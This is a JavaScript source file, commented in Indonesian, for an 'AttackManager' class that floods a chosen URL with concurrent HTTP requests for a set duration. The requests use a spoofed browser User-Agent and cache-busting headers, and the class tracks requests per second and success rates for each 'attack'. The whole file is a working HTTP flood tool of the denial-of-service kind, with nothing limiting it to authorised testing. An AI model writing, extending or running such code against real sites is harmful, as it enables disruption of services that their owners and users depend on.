import axios from 'axios';
import chalk from 'chalk';
import logger from './logger.js';

class AttackManager {
    constructor() {
        this.attacks = new Map();
        this.requestCount = 0;
        this.requestHistory = [];
        this.maxHistory = 100;
        this.isActive = true;
    }

    // Validasi URL dengan error handling
    validateUrl(url) {
        try {
            if (!url) {
                throw new Error('URL tidak boleh kosong');
            }

            // Tambahkan http:// jika tidak ada
            if (!url.startsWith('http')) {
                url = 'http://' + url;
            }
            
            const parsedUrl = new URL(url);
            const isValid = parsedUrl.protocol === 'http:' || parsedUrl.protocol === 'https:';
            
            if (!isValid) {
                throw new Error('Protocol tidak valid');
            }
            
            return true;
        } catch (error) {
            logger.error('URL validation failed', { url, error: error.message });
            return false;
        }
    }

    // Method untuk melakukan HTTP request dengan error handling
    async makeRequest(url, method = 'GET', timeout = 8000) {
        if (!this.validateUrl(url)) {
            return { 
                success: false, 
                error: 'URL tidak valid',
                details: 'Pastikan URL dimulai dengan http:// atau https://'
            };
        }

        try {
            const startTime = Date.now();
            const response = await axios({
                method: method.toLowerCase(),
                url: url,
                timeout: timeout,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                },
                validateStatus: () => true
            });
            
            const endTime = Date.now();
            const responseTime = endTime - startTime;

            this.requestCount++;
            
            // Simpan ke history
            this.requestHistory.push({
                url: url,
                method: method,
                status: response.status,
                responseTime: responseTime,
                timestamp: new Date().toLocaleString('id-ID')
            });

            // Batasi history
            if (this.requestHistory.length > this.maxHistory) {
                this.requestHistory.shift();
            }

            return {
                success: true,
                status: response.status,
                responseTime: responseTime,
                data: response.data
            };
        } catch (error) {
            this.requestCount++;
            
            const errorDetails = {
                url: url,
                method: method,
                status: 0,
                responseTime: 0,
                error: error.message,
                timestamp: new Date().toLocaleString('id-ID')
            };

            this.requestHistory.push(errorDetails);

            logger.debug('Request failed', errorDetails);

            return {
                success: false,
                error: error.message,
                status: error.response?.status || 0,
                details: 'Request timeout atau jaringan bermasalah'
            };
        }
    }

    // Method untuk memulai attack dengan error handling
    async startAttack(targetUrl, durationMs, concurrency = 3, method = 'GET') {
        try {
            if (!this.validateUrl(targetUrl)) {
                throw new Error('URL tidak valid. Pastikan URL benar.');
            }

            const attackId = Date.now().toString();
            logger.info(`Starting attack`, { attackId, targetUrl, durationMs, concurrency });

            const attackInfo = {
                target: targetUrl,
                method: method,
                startTime: Date.now(),
                endTime: Date.now() + durationMs,
                requests: 0,
                successful: 0,
                failed: 0,
                active: true,
                concurrency: concurrency
            };

            this.attacks.set(attackId, attackInfo);

            // Fungsi untuk melakukan requests
            const makeRequests = async (workerId) => {
                while (this.isActive && attackInfo.active && Date.now() < attackInfo.endTime) {
                    try {
                        const result = await this.makeRequest(targetUrl, method);
                        attackInfo.requests++;
                        
                        if (result.success) {
                            attackInfo.successful++;
                        } else {
                            attackInfo.failed++;
                        }
                        
                        // Log setiap 25 requests per worker
                        if (attackInfo.requests % (25 * concurrency) === 0) {
                            const elapsed = (Date.now() - attackInfo.startTime) / 1000;
                            const rps = (attackInfo.requests / elapsed).toFixed(2);
                            logger.debug(`Attack progress`, { 
                                attackId, 
                                requests: attackInfo.requests, 
                                rps 
                            });
                        }
                        
                        // Tunggu sebentar antara requests
                        await new Promise(resolve => setTimeout(resolve, 100));
                    } catch (error) {
                        attackInfo.failed++;
                        logger.debug('Request worker error', { error: error.message });
                    }
                }
            };

            // Jalankan multiple concurrent requests
            const promises = [];
            for (let i = 0; i < concurrency; i++) {
                promises.push(makeRequests(i));
            }

            // Jalankan attack di background
            Promise.all(promises).then(() => {
                if (attackInfo.active) {
                    attackInfo.active = false;
                    const totalTime = (Date.now() - attackInfo.startTime) / 1000;

                    const result = {
                        attackId: attackId,
                        target: targetUrl,
                        totalRequests: attackInfo.requests,
                        successful: attackInfo.successful,
                        failed: attackInfo.failed,
                        duration: totalTime,
                        rps: (attackInfo.requests / totalTime).toFixed(2),
                        successRate: attackInfo.requests > 0 ? 
                            ((attackInfo.successful / attackInfo.requests) * 100).toFixed(2) : '0.00'
                    };

                    logger.success(`Attack completed`, result);
                    this.attacks.delete(attackId);
                }
            }).catch(error => {
                logger.error(`Attack error`, { attackId, error: error.message });
                attackInfo.active = false;
                this.attacks.delete(attackId);
            });

            return attackId;

        } catch (error) {
            logger.error('Failed to start attack', error);
            throw error;
        }
    }

    // Method untuk mendapatkan status attack
    getAttackStatus(attackId) {
        try {
            const attack = this.attacks.get(attackId);
            if (!attack) return null;

            const now = Date.now();
            const elapsed = Math.floor((now - attack.startTime) / 1000);
            const remaining = Math.max(0, Math.floor((attack.endTime - now) / 1000));
            
            return {
                ...attack,
                elapsed: elapsed,
                remaining: remaining,
                progress: ((elapsed / (elapsed + remaining)) * 100).toFixed(1)
            };
        } catch (error) {
            logger.error('Error getting attack status', error);
            return null;
        }
    }

    // Method untuk mendapatkan semua active attacks
    getActiveAttacks() {
        try {
            return Array.from(this.attacks.entries()).map(([id, attack]) => ({
                id,
                ...this.getAttackStatus(id)
            })).filter(attack => attack !== null);
        } catch (error) {
            logger.error('Error getting active attacks', error);
            return [];
        }
    }

    // Method untuk menghentikan attack tertentu
    stopAttack(attackId) {
        try {
            const attack = this.attacks.get(attackId);
            if (attack) {
                attack.active = false;
                this.attacks.delete(attackId);
                logger.info(`Attack stopped`, { attackId });
                return true;
            }
            return false;
        } catch (error) {
            logger.error('Error stopping attack', error);
            return false;
        }
    }

    // Method untuk menghentikan semua attack
    stopAllAttacks() {
        try {
            const stopped = this.attacks.size;
            for (const [id, attack] of this.attacks) {
                attack.active = false;
            }
            this.attacks.clear();
            logger.info(`All attacks stopped`, { stopped });
            return stopped;
        } catch (error) {
            logger.error('Error stopping all attacks', error);
            return 0;
        }
    }

    // Method untuk mendapatkan total requests
    getTotalRequests() {
        return this.requestCount;
    }

    // Method untuk mendapatkan request history
    getRequestHistory(limit = 10) {
        try {
            return this.requestHistory.slice(-limit).reverse();
        } catch (error) {
            logger.error('Error getting request history', error);
            return [];
        }
    }

    // Method untuk mendapatkan statistics
    getStatistics() {
        try {
            const total = this.requestCount;
            const active = this.attacks.size;
            const history = this.requestHistory;

            const successCount = history.filter(r => r.status >= 200 && r.status < 300).length;
            const errorCount = history.filter(r => r.status >= 400).length;
            const timeoutCount = history.filter(r => r.status === 0).length;

            return {
                totalRequests: total,
                activeAttacks: active,
                successRate: total > 0 ? ((successCount / total) * 100).toFixed(2) : '0.00',
                errorRate: total > 0 ? ((errorCount / total) * 100).toFixed(2) : '0.00',
                timeoutRate: total > 0 ? ((timeoutCount / total) * 100).toFixed(2) : '0.00'
            };
        } catch (error) {
            logger.error('Error getting statistics', error);
            return {
                totalRequests: 0,
                activeAttacks: 0,
                successRate: '0.00',
                errorRate: '0.00',
                timeoutRate: '0.00'
            };
        }
    }

    // Cleanup
    cleanup() {
        try {
            this.isActive = false;
            this.stopAllAttacks();
            logger.info('Attack manager cleaned up');
        } catch (error) {
            logger.error('Error during cleanup', error);
        }
    }
}

export default AttackManager;